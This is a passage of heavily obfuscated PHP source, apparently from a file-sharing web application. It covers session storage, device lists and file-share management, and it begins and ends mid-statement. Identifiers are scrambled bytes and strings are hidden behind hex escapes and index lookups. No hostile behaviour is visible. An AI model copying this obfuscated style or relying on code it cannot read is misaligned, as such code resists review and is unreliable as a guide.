‹Ãà[2281]][$Œ ‹Ãà[199]] == $Œ ‹Ãà[200]) { $¹Óêàüƒ[] = $¸Áşåòâ[$Œ ‹Ãà[491]]; unset($·›±ãÖ˜[$Ë±·¡Ñ]); continue; } } } $¸Áşåòâ[$Œ ‹Ãà[544]] = $©¸ÛÏ¸; unset($¸Áşåòâ[$Œ ‹Ãà[2508]]); $’ŠâÔİ[] = $¸Áşåòâ; } $this->clearSystemPathLog($¹Óêàüƒ); return $’ŠâÔİ; } private function clearSystemPathLog($ïûá›äğ) { $¿ÚÕÓ›“ =& $_SERVER[‰‰Ş‚€]; if (count($ïûá›äğ) == 0) { return; } $•ëœø¥¬ = array($¿ÚÕÓ›“[491] => array($¿ÚÕÓ›“[17], array_unique($ïûá›äğ))); $this->where($•ëœø¥¬)->delete(); } public function deviceList($˜·Ñ§¹±, $ã¶€ØÃŒ = 0) { $Õ±öúÓ =& $_SERVER[‰‰Ş‚€]; $ãˆ­‡½ò = array($Õ±öúÓ[1820] => $˜·Ñ§¹±, $Õ±öúÓ[242] => array($Õ±öúÓ[1124], $ã¶€ØÃŒ), $Õ±öúÓ[43] => $Õ±öúÓ[1964]); $çÓ›çÂö = array(); $–·ß³¤® = $this->field($Õ±öúÓ[2509])->where($ãˆ­‡½ò)->order($Õ±öúÓ[2279])->limit(50)->select(); foreach ($–·ß³¤® as $ö ¿€€ => $éÌ¹÷å) { if ($ö ¿€€ > 0 && abs($éÌ¹÷å[$Õ±öúÓ[242]] - $–·ß³¤®[$ö ¿€€ - 1][$Õ±öúÓ[242]]) < 5) { continue; } $µ¶Ä¬îí = json_decode($éÌ¹÷å[$Õ±öúÓ[544]], !0); $éÌ¹÷å[$Õ±öúÓ[2497]] = isset($µ¶Ä¬îí[$Õ±öúÓ[2497]]) ? $µ¶Ä¬îí[$Õ±öúÓ[2497]] : $Õ±öúÓ[22]; unset($µ¶Ä¬îí[$Õ±öúÓ[2497]]); $ì‰ñÁ£• = $this->deviceType($µ¶Ä¬îí[$Õ±öúÓ[2268]]); if (isset($çÓ›çÂö[$ì‰ñÁ£•])) { continue; } $éÌ¹÷å[$Õ±öúÓ[2503]] = IpLocation::get($éÌ¹÷å[$Õ±öúÓ[2497]]); $éÌ¹÷å[$Õ±öúÓ[544]] = $µ¶Ä¬îí; $çÓ›çÂö[$ì‰ñÁ£•] = $éÌ¹÷å; } return array_values($çÓ›çÂö); } public function deviceType($„ÑĞ”ØŒ) { return $„ÑĞ”ØŒ; } } goto Dí‚ŠÚÍäŞ; a¦ÊÕ‚†Æ³: class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\x74\x65\155\x5f\163\145\x73\x73\151\157\x6e"; public function get($ò ß–ÒÕ) { $ÀÒŸãÁ³ =& $_SERVER[‰‰Ş‚€]; $˜‚—öÊ¸ = $this->where(array($ÀÒŸãÁ³[2159] => $ò ß–ÒÕ))->find(); if (!is_array($˜‚—öÊ¸)) { return !1; } return $˜‚—öÊ¸[$ÀÒŸãÁ³[179]]; } public function set($©¨şƒÖ€, $œ¿¹ü³º, $‡úöÌøÇ = 3600) { $€ÖáƒÏ® =& $_SERVER[‰‰Ş‚€]; $ÂĞô€ = array($€ÖáƒÏ®[2159] => $©¨şƒÖ€, $€ÖáƒÏ®[2060] => $œ¿¹ü³º, $€ÖáƒÏ®[2160] => $‡úöÌøÇ + time()); if (Session::get($€ÖáƒÏ®[2161])) { $ÂĞô€[$€ÖáƒÏ®[1820]] = Session::get($€ÖáƒÏ®[2161]); } else { $ÂĞô€[$€ÖáƒÏ®[1820]] = 0; } if ($this->get($©¨şƒÖ€)) { return $this->where(array($€ÖáƒÏ®[2159] => $©¨şƒÖ€))->save($ÂĞô€); } else { return $this->add($ÂĞô€, array(), !0); } } public function remove($ë™²Öª) { return $this->where(array($_SERVER[‰‰Ş‚€][2159] => $ë™²Öª))->delete(); } public function clearTimeout() { return $this->where($_SERVER[‰‰Ş‚€][2162] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\145"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\x79\124\151\x6d\145", "\164\x69\155\145", "\151\156\x73\145\162\x74\54\x75\x70\x64\141\x74\x65", "\x66\x75\x6e\143\x74\151\157\x6e"), array("\x63\x72\x65\141\x74\145\x54\x69\x6d\145", "\x74\151\x6d\145", "\x69\x6e\x73\x65\162\164", "\146\x75\156\x63\x74\151\157\156"), array("\x6f\x70\164\x69\157\156\x73", '', "\151\156\x73\145\x72\x74\x2c\165\160\144\x61\x74\x65\54\x73\x65\x6c\x65\143\164", "\x6a\163\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($×Å¼ïĞ) { $éï»êª« =& $_SERVER[‰‰Ş‚€]; $ò¬Ú¤±Ï = isset($×Å¼ïĞ[0]) ? $×Å¼ïĞ[0] : !1; $ìÌÜ¶¦Ö = $éï»êª«[2163] . USER_ID; return array($éï»êª«[2164] => array(USER_ID, $éï»êª«[2165]), $éï»êª«[2104] => array($ò¬Ú¤±Ï, $éï»êª«[2166], $ìÌÜ¶¦Ö)); } protected function listSimple() { $ˆ‹Ã¦½ = array($_SERVER[‰‰Ş‚€][1820] => USER_ID); $ş·É²¤Ñ = $this->field($this->fieldList)->where($ˆ‹Ã¦½)->select(); return $ş·É²¤Ñ ? $ş·É²¤Ñ : array(); } protected function getInfo($¹‚•’öË, $×Ö³¶ŠŒ = false, $Â˜ï¾ö¸ = '') { $ŸÅŸĞû¦ =& $_SERVER[‰‰Ş‚€]; if (!$Â˜ï¾ö¸) { $Â˜ï¾ö¸ = $ŸÅŸĞû¦[2163] . USER_ID; } if ($×Ö³¶ŠŒ) { return $this->_getShareInfo(array($ŸÅŸĞû¦[688] => $¹‚•’öË)); } $Ù—İƒ« = $this->cacheFunctionGet($ŸÅŸĞû¦[2106], $¹‚•’öË, $Â˜ï¾ö¸); $Û¸æª = $this->shareInfoMofify($Ù—İƒ«, $ŸÅŸĞû¦[234]); if (isset($Ù—İƒ«[$ŸÅŸĞû¦[98]]) && $Û¸æª != $Ù—İƒ«[$ŸÅŸĞû¦[98]]) { $Ğ±¼‚ı = $this->cacheKeyMake($ŸÅŸĞû¦[2106], $¹‚•’öË, $Â˜ï¾ö¸); $Ù—İƒ« = $this->_getShareInfo(array($ŸÅŸĞû¦[688] => $¹‚•’öË)); Cache::set($Ğ±¼‚ı, $Ù—İƒ«); } return $Ù—İƒ«; } private function shareInfoMofify(&$¾Şº–Ï, $«ÈıÚä = "\x67\145\164") { $§ÎŒå‰ƒ =& $_SERVER[‰‰Ş‚€]; if (!$¾Şº–Ï || !isset($¾Şº–Ï[$§ÎŒå‰ƒ[688]])) { return; } $£ı§é¸˜ = $§ÎŒå‰ƒ[2167] . $¾Şº–Ï[$§ÎŒå‰ƒ[688]]; if ($«ÈıÚä == $§ÎŒå‰ƒ[234]) { return Cache::get($£ı§é¸˜); } else { if ($«ÈıÚä == $§ÎŒå‰ƒ[2135]) { $¥¢Ãê½ = Cache::get($£ı§é¸˜); if ($¥¢Ãê½ === $¾Şº–Ï[$§ÎŒå‰ƒ[98]]) { return; } $¾Şº–Ï[$§ÎŒå‰ƒ[2168]] = USER_ID . $§ÎŒå‰ƒ[481] . $¾Şº–Ï[$§ÎŒå‰ƒ[98]]; Cache::set($£ı§é¸˜, $¾Şº–Ï[$§ÎŒå‰ƒ[98]]); } else { if ($«ÈıÚä == $§ÎŒå‰ƒ[2169]) { Cache::remove($£ı§é¸˜); } } } } public function getInfoByHash($­«ºıÇÕ) { return $this->_getShareInfo(array($_SERVER[‰‰Ş‚€][2170] => $­«ºıÇÕ)); } public function getInfoByPath($şÈÙÇäÚ) { $Ê¿†ó©¿ =& $_SERVER[‰‰Ş‚€]; $ş™Íğèü = array($Ê¿†ó©¿[1820] => USER_ID, $Ê¿†ó©¿[202] => $şÈÙÇäÚ); return $this->_getShareInfo($ş™Íğèü); } public function getInfoBySourcePath($îÉÇÄŠ¬) { $ŞÔÇ² =& $_SERVER[‰‰Ş‚€]; $›œß­ó± = array($ŞÔÇ²[1820] => USER_ID, $ŞÔÇ²[1296] => $îÉÇÄŠ¬); return $this->_getShareInfo($›œß­ó±); } private function _getShareInfo($®ªõà‰») { $ÍŠˆ‹€¬ =& $_SERVER[‰‰Ş‚€]; $¶Ç¦©» = $this->where($®ªõà‰»)->find(); if (!$¶Ç¦©») { return !1; } $®ªõà‰» = array($ÍŠˆ‹€¬[688] => $¶Ç¦©»[$ÍŠˆ‹€¬[688]]); $»ÕÅ±óÀ = $ÍŠˆ‹€¬[2171]; $°ÊÚÌò¨ = Model($ÍŠˆ‹€¬[689])->order($ÍŠˆ‹€¬[491])->field($»ÕÅ±óÀ)->where($®ªõà‰»)->select(); if ($¶Ç¦©»[$ÍŠˆ‹€¬[202]] == $ÍŠˆ‹€¬[239]) { $¶Ç¦©»[$ÍŠˆ‹€¬[100]] = IO::info($¶Ç¦©»[$ÍŠˆ‹€¬[1296]]); } else { $¶Ç¦©»[$ÍŠˆ‹€¬[100]] = Model($ÍŠˆ‹€¬[1467])->pathInfo($¶Ç¦©»[$ÍŠˆ‹€¬[202]]); } $¶Ç¦©»[$ÍŠˆ‹€¬[2172]] = $°ÊÚÌò¨; $this->shareInfoMofify($¶Ç¦©», $ÍŠˆ‹€¬[2135]); return $¶Ç¦©»; } protected function getInfoAuth($ê‡¹™•Œ) { $êÖ±³Ë– =& $_SERVER[‰‰Ş‚€]; $ÇÉééßÁ = $this->getInfo($ê‡¹™•Œ); if ($ÇÉééßÁ[$êÖ±³Ë–[1820]] == USER_ID) { $ÇÉééßÁ[$êÖ±³Ë–[506]] = $ÇÉééßÁ[$êÖ±³Ë–[100]][$êÖ±³Ë–[506]]; } else { $ÇÉééßÁ[$êÖ±³Ë–[506]] = Model($êÖ±³Ë–[587])->authMake($ÇÉééßÁ[$êÖ±³Ë–[2172]]); } return $ÇÉééßÁ; } protected function listData($ äğŠò = null, $™€Àğƒ = 300) { $—ıÃà¼â =& $_SERVER[‰‰Ş‚€]; $îÄãŸ¿Œ = array(array($—ıÃà¼â[582] => array($—ıÃà¼â[1122], 0), $—ıÃà¼â[686] => array($—ıÃà¼â[1122], 0), $—ıÃà¼â[2173] => $—ıÃà¼â[2123])); if ($ äğŠò == $—ıÃà¼â[2174]) { $îÄãŸ¿Œ = array($—ıÃà¼â[582] => 1); } else { if ($ äğŠò == $—ıÃà¼â[1279]) { $îÄãŸ¿Œ = array($—ıÃà¼â[686] => 1); } } $îÄãŸ¿Œ[$—ıÃà¼â[1820]] = USER_ID; $‰¢Ã Ä = $this->where($îÄãŸ¿Œ)->selectPage($™€Àğƒ); return $‰¢Ã Ä; } protected function listToMe($ğØ¥‘áğ = 300) { $¢ÅƒË–Ê =& $_SERVER[‰‰Ş‚€]; $òğıíÇ¢ = Model($¢ÅƒË–Ê[2175])->userGroupParents(USER_ID); $ì¨†Í = array($¢ÅƒË–Ê[671] => SourceModel::TYPE_USER, $¢ÅƒË–Ê[589] => USER_ID); if ($òğıíÇ¢) { $ì¨†Í = array(array($¢ÅƒË–Ê[671] => SourceModel::TYPE_USER, $¢ÅƒË–Ê[589] => USER_ID), array($¢ÅƒË–Ê[671] => SourceModel::TYPE_GROUP, $¢ÅƒË–Ê[589] => array($¢ÅƒË–Ê[17], $òğıíÇ¢)), $¢ÅƒË–Ê[2173] => $¢ÅƒË–Ê[2123]); } $ÇçªÒ°¬ = Model($¢ÅƒË–Ê[689])->where($ì¨†Í)->selectPage($ğØ¥‘áğ); $“ˆŸ×«Ô = array_to_keyvalue_group($ÇçªÒ°¬[$¢ÅƒË–Ê[454]], $¢ÅƒË–Ê[688]); if (!$“ˆŸ×«Ô) { return $ÇçªÒ°¬; } $†’Ùâ°‹ = $¢ÅƒË–Ê[2176]; $ì¨†Í = array($¢ÅƒË–Ê[688] => array($¢ÅƒË–Ê[511], array_keys($“ˆŸ×«Ô)), $¢ÅƒË–Ê[1820] => array($¢ÅƒË–Ê[1124], $¢ÅƒË–Ê[239])); $ ÔìôÛÛ = $this->field($†’Ùâ°‹)->where($ì¨†Í)->select(); foreach ($ ÔìôÛÛ as $Ã“õ¤Ì¿ => &$³Ş“£à) { $³Ş“£à[$¢ÅƒË–Ê[2172]] = $“ˆŸ×«Ô[$³Ş“£à[$¢ÅƒË–Ê[688]]]; } unset($³Ş“£à); $Œ‚¯Ù— = array($¢ÅƒË–Ê[2177] => $ ÔìôÛÛ, $¢ÅƒË–Ê[2178] => $ÇçªÒ°¬[$¢ÅƒË–Ê[451]]); return $Œ‚¯Ù—; } protected function shareAdd($áßÍùÅı, $ İ¸“ãĞ) { $ôĞüŞµ± =& $_SERVER[‰‰Ş‚€]; $ƒË’ĞÓÂ = $this->_addShareData($áßÍùÅı, $ İ¸“ãĞ); if (!empty($ İ¸“ãĞ[$ôĞüŞµ±[2179]])) { $this->_shareAuthSet($ƒË’ĞÓÂ, $ İ¸“ãĞ[$ôĞüŞµ±[2179]]); } $this->shareEventAdd($áßÍùÅı, $ İ¸“ãĞ, $ôĞüŞµ±[2180]); return $ƒË’ĞÓÂ; } protected function shareAddSystem($ÓäÃ§—, $¹Š¸¦ßø) { $ÀçÚ¤»¾ =& $_SERVER[‰‰Ş‚€]; $‚òªÌé¦ = $this->_addShareData($ÓäÃ§—, $¹Š¸¦ßø, $ÀçÚ¤»¾[200]); $this->_shareAuthSet($‚òªÌé¦, $¹Š¸¦ßø[$ÀçÚ¤»¾[2179]]); return $‚òªÌé¦; } private function shareEventAdd($íà÷“¨”, $©ıëÌ½Ğ, $¬£ïÏÁê = "\x61\144\144") { $ĞÃ—¥‹ª =& $_SERVER[‰‰Ş‚€]; if (!$íà÷“¨” || $íà÷“¨” == $ĞÃ—¥‹ª[239]) { return; } if ($¬£ïÏÁê == $ĞÃ—¥‹ª[2180]) { if ($©ıëÌ½Ğ[$ĞÃ—¥‹ª[582]] == $ĞÃ—¥‹ª[101]) { Model($ĞÃ—¥‹ª[656])->eventShare($íà÷“¨”, $ĞÃ—¥‹ª[2181]); } if ($©ıëÌ½Ğ[$ĞÃ—¥‹ª[686]] == $ĞÃ—¥‹ª[101]) { Model($ĞÃ—¥‹ª[656])->eventShare($íà÷“¨”, $ĞÃ—¥‹ª[2182]); } return; } $ì“éñº = $this->getInfoByPath($íà÷“¨”); $ûšù·šõ = $ĞÃ—¥‹ª[2183]; if ($ì“éñº[$ĞÃ—¥‹ª[582]] == $ĞÃ—¥‹ª[239] && $©ıëÌ½Ğ[$ĞÃ—¥‹ª[582]] == $ĞÃ—¥‹ª[101]) { $ûšù·šõ = $ĞÃ—¥‹ª[2181]; } if ($ì“éñº[$ĞÃ—¥‹ª[582]] == $ĞÃ—¥‹ª[101] && $©ıëÌ½Ğ[$ĞÃ—¥‹ª[582]] == $ĞÃ—¥‹ª[239]) { $ûšù·šõ = $ĞÃ—¥‹ª[2184]; } if ($ì“éñº[$ĞÃ—¥‹ª[686]] == $ĞÃ—¥‹ª[239] && $©ıëÌ½Ğ[$ĞÃ—¥‹ª[686]] == $ĞÃ—¥‹ª[101]) { $ûšù·šõ = $ĞÃ—¥‹ª[2182]; } if ($ì“éñº[$ĞÃ—¥‹ª[686]] == $ĞÃ—¥‹ª[101] && $©ıëÌ½Ğ[$ĞÃ—¥‹ª[686]] == $ĞÃ—¥‹ª[239]) { $ûšù·šõ = $ĞÃ—¥‹ª[2185]; } Model($ĞÃ—¥‹ª[656])->eventShare($íà÷“¨”, $ûšù·šõ); return; } private function _addShareData($ Ñü‹’¾, $³ê¤ßíÂ = array(), $’Ş‚Âáå = false) { $­óØ’¨ =& $_SERVER[‰‰Ş‚€]; $òæÅ÷¤÷ = $’Ş‚Âáå == $­óØ’¨[200] ? 0 : USER_ID; $ëÒªÉ¿÷ = array($­óØ’¨[510] => $ Ñü‹’¾, $­óØ’¨[1811] => $òæÅ÷¤÷); if ($ Ñü‹’¾ == 0) { $ëÒªÉ¿÷ = array($­óØ’¨[2186] => $³ê¤ßíÂ[$­óØ’¨[1296]], $­óØ’¨[1811] => $òæÅ÷¤÷); } if ($ì‘ŠˆõÂ = $this->where($ëÒªÉ¿÷)->find()) { return $ì‘ŠˆõÂ[$­óØ’¨[688]]; } if ($ Ñü‹’¾ == 0) { $ÛºÒçíé = array($­óØ’¨[42] => get_path_this($³ê¤ßíÂ[$­óØ’¨[97]])); } else { $ÛºÒçíé = Model($­óØ’¨[929])->sourceInfo($ Ñü‹’¾); if (!$ÛºÒçíé) { return !1; } } if (!$³ê¤ßíÂ[$­óØ’¨[1707]]) { $³ê¤ßíÂ[$­óØ’¨[1707]] = $ÛºÒçíé[$­óØ’¨[42]]; } $Èªñ­ñğ = array($­óØ’¨[1811] => $òæÅ÷¤÷, $­óØ’¨[510] => $ Ñü‹’¾, $­óØ’¨[1707] => $­óØ’¨[22], $­óØ’¨[582] => 0, $­óØ’¨[686] => 0, $­óØ’¨[1296] => $­óØ’¨[22], $­óØ’¨[391] => $­óØ’¨[22], $­óØ’¨[996] => $­óØ’¨[22], $­óØ’¨[2187] => 0, $­óØ’¨[2188] => 0, $­óØ’¨[858] => 0, $­óØ’¨[2189] => $­óØ’¨[22], $­óØ’¨[2170] => $­óØ’¨[22]); $äØÆªğ« = explode($­óØ’¨[60], $­óØ’¨[2190]); foreach ($äØÆªğ« as $Öàà•°²) { if (!isset($³ê¤ßíÂ[$Öàà•°²])) { continue; } $Èªñ­ñğ[$Öàà•°²] = $³ê¤ßíÂ[$Öàà•°²]; } $é–­èû‰ = $this->add($Èªñ­ñğ); $öˆí“ÛÇ = array($­óØ’¨[2170] => short_id($é–­èû‰)); if ($this->where($öˆí“ÛÇ)->find()) { $öˆí“ÛÇ[$­óØ’¨[2170]] .= $­óØ’¨[481] . rand_string(2, 3); } $this->where(array($­óØ’¨[2191] => $é–­èû‰))->save($öˆí“ÛÇ); return $é–­èû‰; } private function _shareAuthSet($ªÆ…îà, $éÇ”õ³§) { $´Úø¨‡¶ =& $_SERVER[‰‰Ş‚€]; if (!is_array($éÇ”õ³§)) { return !1; } $ÙĞã±í  = Model($´Úø¨‡¶[2133]); $ÙĞã±í ->where(array($´Úø¨‡¶[688] => $ªÆ…îà))->delete(); $ûš´× ç = array(); foreach ($éÇ”õ³§ as $à£Û¿‚€) { $í„¶×ú¾ = SourceModel::TYPE_USER; if ($à£Û¿‚€[$´Úø¨‡¶[199]] == SourceModel::TYPE_GROUP) { $í„¶×ú¾ = SourceModel::TYPE_GROUP; } $Á›Å = array($´Úø¨‡¶[688] => $ªÆ…îà, $´Úø¨‡¶[199] => $í„¶×ú¾, $´Úø¨‡¶[589] => intval($à£Û¿‚€[$´Úø¨‡¶[589]]), $´Úø¨‡¶[2129] => 0, $´Úø¨‡¶[2192] => -1); if ($à£Û¿‚€[$´Úø¨‡¶[2129]]) { $Á›Å[$´Úø¨‡¶[2129]] = $à£Û¿‚€[$´Úø¨‡¶[2129]]; } else { if ($à£Û¿‚€[$´Úø¨‡¶[2192]]) { $Á›Å[$´Úø¨‡¶[2192]] = $à£Û¿‚€[$´Úø¨‡¶[2192]]; } } $ûš´× ç[] = $Á›Å; } return $ÙĞã±í ->addAll($ûš´× ç, array(), !0); } public function numViewAdd($¬éâ¾) { $ë›Çı‹¯ =& $_SERVER[‰‰Ş‚€]; $Äî‚¯°­ = array($ë›Çı‹¯[2191] => $¬éâ¾); $this->where($Äî‚¯°­)->setAdd($ë›Çı‹¯[2187]); } public function numDownloadAdd($×ëËÌà¾) { $â°³’‚– =& $_SERVER[‰‰Ş‚€]; $£¸Öêë = array($â°³’‚–[2191] => $×ëËÌà¾); $this->where($£¸Öêë)->setAdd($â°³’‚–[2188]); } protected function shareEdit($÷ñô»å, $ƒÆƒÛ³Ğ) { $¼Ë¯ı”¤ =& $_SERVER[‰‰Ş‚€]; $“£•öÏÀ = $this->getInfo($÷ñô»å); if (!$“£•öÏÀ) { return !1; } if ($ƒÆƒÛ³Ğ[$¼Ë¯ı”¤[2170]] && $ƒÆƒÛ³Ğ[$¼Ë¯ı”¤[582]] == $¼Ë¯ı”¤[101]) { if ($ƒÆƒÛ³Ğ[$¼Ë¯ı”¤[2170]] == $“£•öÏÀ[$¼Ë¯ı”¤[2170]]) { unset($ƒÆƒÛ³Ğ[$¼Ë¯ı”¤[2170]]); } if ($ƒÆƒÛ³Ğ[$¼Ë¯ı”¤[2170]]) { $†¸÷¨… = $this->where(array($¼Ë¯ı”¤[2193] => $ƒÆƒÛ³Ğ[$¼Ë¯ı”¤[2170]]))->find(); if ($†¸÷¨…) { return !1; } if (!is_array($ƒÆƒÛ³Ğ[$¼Ë¯ı”¤[2189]])) { $ƒÆƒÛ³Ğ[$¼Ë¯ı”¤[2189]] = is_array($“£•öÏÀ[$¼Ë¯ı”¤[2189]]) ? $“£•öÏÀ[$¼Ë¯ı”¤[2189]] : array(); } if (!$ƒÆƒÛ³Ğ[$¼Ë¯ı”¤[2189]][$¼Ë¯ı”¤[2194]]) { $ƒÆƒÛ³Ğ[$¼Ë¯ı”¤[2189]][$¼Ë¯ı”¤[2194]] = $“£•öÏÀ[$¼Ë¯ı”¤[2170]]; $ƒÆƒÛ³Ğ[$¼Ë¯ı”¤[2189]][$¼Ë¯ı”¤[2195]] = $¼Ë¯ı”¤[101]; } } } $this->_checkLinkShare($ƒÆƒÛ³Ğ, $“£•öÏÀ); $Üåêû¢İ = array(); $µÁ¢ö¨ = explode($¼Ë¯ı”¤[60], $¼Ë¯ı”¤[2196]); foreach ($µÁ¢ö¨ as $Ò­‘Èò¨) { if (!array_key_exists($Ò­‘Èò¨, $ƒÆƒÛ³Ğ)) { continue; } $Üåêû¢İ[$Ò­‘Èò¨] = $ƒÆƒÛ³Ğ[$Ò­‘Èò¨]; } $this->shareEventAdd($“£•öÏÀ[$¼Ë¯ı”¤[202]], $ƒÆƒÛ³Ğ, $¼Ë¯ı”¤[1990]); $this->where(array($¼Ë¯ı”¤[2191] => $÷ñô»å))->save($Üåêû¢İ); if (isset($ƒÆƒÛ³Ğ[$¼Ë¯ı”¤[2179]])) { $this->_shareAuthSet($÷ñô»å, $ƒÆƒÛ³Ğ[$¼Ë¯ı”¤[2179]]); } return !0; } private function _checkLinkShare($ôâ²Êõ, $ı„åÔ¾›) { $¦áõšÇ =& $_SERVER[‰‰Ş‚€]; if ($ôâ²Êõ[$¦áõšÇ[582]] != $¦áõšÇ[101]) { return; } $Ô…”ˆ—´ = $ı„åÔ¾›[$¦áõšÇ[100]][$¦áõšÇ[202]]; if ($ı„åÔ¾›[$¦áõšÇ[100]][$¦áõšÇ[43]] != $¦áõšÇ[241]) { $šü€Î€ = $this->_folderReport($Ô…”ˆ—´); if (!$šü€Î€) { return; } show_json(LNG($¦áõšÇ[2197]) . $¦áõšÇ[2198] . $šü€Î€, !1); } $÷ãÏÙûæ = Model($¦áõšÇ[929])->fileInfoGet($ı„åÔ¾›[$¦áõšÇ[100]][$¦áõšÇ[202]]); if (!$÷ãÏÙûæ) { return; } $ù’î´õ¡ = $this->shareFileMeta($÷ãÏÙûæ[$¦áõšÇ[561]]); if (isset($ù’î´õ¡[$¦áõšÇ[459]]) && $ù’î´õ¡[$¦áõšÇ[459]] == $¦áõšÇ[101]) { show_json(LNG($¦áõšÇ[2199]), !1); } } private function _folderReport($™­—œöË) { $ÍßŞÙ›ã =& $_SERVER[‰‰Ş‚€]; $¡·šî¢‚ = array($ÍßŞÙ›ã[561] => array($ÍßŞÙ›ã[1122], 0), $ÍßŞÙ›ã[846] => 3); $š’Ï›¼ø = Model($ÍßŞÙ›ã[2200])->where($¡·šî¢‚)->field($ÍßŞÙ›ã[561])->select(); if (!$š’Ï›¼ø) { return !1; } $š’Ï›¼ø = array_to_keyvalue($š’Ï›¼ø, $ÍßŞÙ›ã[22], $ÍßŞÙ›ã[561]); $ÙÎÁèœ = $ÍßŞÙ›ã[60] . $™­—œöË . $ÍßŞÙ›ã[60]; $¡·šî¢‚ = array($ÍßŞÙ›ã[561] => array($ÍßŞÙ›ã[17], $š’Ï›¼ø), $ÍßŞÙ›ã[604] => array($ÍßŞÙ›ã[478], "\45{$ÙÎÁèœ}\45"), $ÍßŞÙ›ã[524] => 0); $áàÇ°Œ = Model($ÍßŞÙ›ã[929])->where($¡·šî¢‚)->field($ÍßŞÙ›ã[2201])->find(); if (!$áàÇ°Œ) { return !1; } $É¤°¸…„ = substr($áàÇ°Œ[$ÍßŞÙ›ã[604]], strpos($áàÇ°Œ[$ÍßŞÙ›ã[604]], $ÙÎÁèœ)); $¡·šî¢‚ = array($ÍßŞÙ›ã[202] => array($ÍßŞÙ›ã[17], trim($É¤°¸…„, $ÍßŞÙ›ã[60]))); $ªÇ«¿å = Model($ÍßŞÙ›ã[929])->where($¡·šî¢‚)->field($ÍßŞÙ›ã[42])->select(); $ÍºÑÙŠ´ = array_to_keyvalue($ªÇ«¿å, $ÍßŞÙ›ã[22], $ÍßŞÙ›ã[42]); $ÍºÑÙŠ´[] = $áàÇ°Œ[$ÍßŞÙ›ã[42]]; return implode($ÍßŞÙ›ã[18], $ÍºÑÙŠ´); } protected function remove($Ùœ´Ò–) { $¨îû©‰„ =& $_SERVER[‰‰Ş‚€]; $œ¥ƒ§õ = is_array($Ùœ´Ò–) ? $Ùœ´Ò– : array($Ùœ´Ò–); for ($Âçñ€ş = 0; $Âçñ€ş < count($œ¥ƒ§õ); $Âçñ€ş++) { $æ¬´É˜ş = $this->getInfo($œ¥ƒ§õ[$Âçñ€ş]); if ($æ¬´É˜ş[$¨îû©‰„[686]] == $¨îû©‰„[101]) { Model($¨îû©‰„[656])->eventShare($æ¬´É˜ş[$¨îû©‰„[202]], $¨îû©‰„[2185]); } if ($æ¬´É˜ş[$¨îû©‰„[582]] == $¨îû©‰„[101]) { Model($¨îû©‰„[656])->eventShare($æ¬´É˜ş[$¨îû©‰„[202]], $¨îû©‰„[2184]); } $this->shareInfoMofify($æ¬´É˜ş, $¨îû©‰„[2169]); } $¨·æ·˜ = array($¨îû©‰„[688] => array($¨îû©‰„[17], $œ¥ƒ§õ)); $Ú¿£Ïï¾ = $this->where($¨·æ·˜)->delete(); if ($Ú¿£Ïï¾) { Model($¨îû©‰„[689])->where($¨·æ·˜)->delete(); } return $Ú¿£Ïï¾; } protected function removeBySource($ßÂ‡ĞÔ¶) { $ÑÕƒì‚Ì =& $_SERVER[‰‰Ş‚€]; $œÃÜï¨… = array($ÑÕƒì‚Ì[510] => array($ÑÕƒì‚Ì[511], $ßÂ‡ĞÔ¶)); $Ë×¦•© = $this->field($ÑÕƒì‚Ì[688])->where($œÃÜï¨…)->select(); $§»ù±‘° = array_to_keyvalue($Ë×¦•©, $ÑÕƒì‚Ì[22], $ÑÕƒì‚Ì[688]); if (!$§»ù±‘°) { return; } foreach ($Ë×¦•© as $úàâ†Œ) { $this->shareInfoMofify($úàâ†Œ, $ÑÕƒì‚Ì[2169]); } $œÃÜï¨… = array($ÑÕƒì‚Ì[2191] => array($ÑÕƒì‚Ì[511], $§»ù±‘°)); $this->where($œÃÜï¨…)->delete(); Model($ÑÕƒì‚Ì[689])->where($œÃÜï¨…)->delete(); } public function listAll($ïş‘è) { $¼·è™¥¼ =& $_SERVER[‰‰Ş‚€]; $‘‡ç·º = array(); if ($ïş‘è[$¼·è™¥¼[1820]]) { $‘‡ç·º[$¼·è™¥¼[1820]] = $ïş‘è[$¼·è™¥¼[1820]]; } if ($ïş‘è[$¼·è™¥¼[857]]) { $Í´Ûé = $ïş‘è[$¼·è™¥¼[858]] ? $ïş‘è[$¼·è™¥¼[858]] : strtotime(date($¼·è™¥¼[2202])); $‘‡ç·º[$¼·è™¥¼[242]] = array($¼·è™¥¼[417], array($ïş‘è[$¼·è™¥¼[857]], $Í´Ûé)); } if ($ïş‘è[$¼·è™¥¼[43]]) { $‘‡ç·º[$ïş‘è[$¼·è™¥¼[43]]] = 1; } else { $‘‡ç·º[] = array($¼·è™¥¼[582] => array($¼·è™¥¼[1122], 0), $¼·è™¥¼[686] => array($¼·è™¥¼[1122], 0), $¼·è™¥¼[2173] => $¼·è™¥¼[2123]); } if ($ïş‘è[$¼·è™¥¼[2119]]) { $‘‡ç·º[] = array($¼·è™¥¼[2170] => $ïş‘è[$¼·è™¥¼[2119]], $¼·è™¥¼[1707] => array($¼·è™¥¼[478], "\x25{$ïş‘è[$¼·è™¥¼[2119]]}\45"), $¼·è™¥¼[2173] => $¼·è™¥¼[2123]); } $ô¢ÍÜ© = $this->_makeOrder()->where($‘‡ç·º)->selectPage(20); if (empty($ô¢ÍÜ©[$¼·è™¥¼[454]])) { return array(); } $this->_listDataApply($ô¢ÍÜ©[$¼·è™¥¼[454]]); return $ô¢ÍÜ©; } public function listDataApply($»íãÌ) { $this->_listDataApply($»íãÌ); return $»íãÌ; } private function _listDataApply(&$Ø¼®»…) { $ßÛ‹®‡Ô =& $_SERVER[‰‰Ş‚€]; $§úÕßÍ° = array_to_keyvalue($Ø¼®»…, $ßÛ‹®‡Ô[22], $ßÛ‹®‡Ô[1820]); $Šı™½Ä = Model($ßÛ‹®‡Ô[617])->userListInfo(array_unique($§úÕßÍ°)); $çÂñÚªó = array_to_keyvalue($Ø¼®»…, $ßÛ‹®‡Ô[22], $ßÛ‹®‡Ô[202]); $ˆ»®Š»° = Model($ßÛ‹®‡Ô[929])->sourceListInfo($çÂñÚªó, !0); foreach ($Ø¼®»… as $üŸÖ²®ú => &$Ú¯ë·É·) { $Â˜ôíÀİ = $Ú¯ë·É·[$ßÛ‹®‡Ô[1820]]; $Ú¯ë·É·[$ßÛ‹®‡Ô[2203]] = $Šı™½Ä[$Â˜ôíÀİ] ? $Šı™½Ä[$Â˜ôíÀİ] 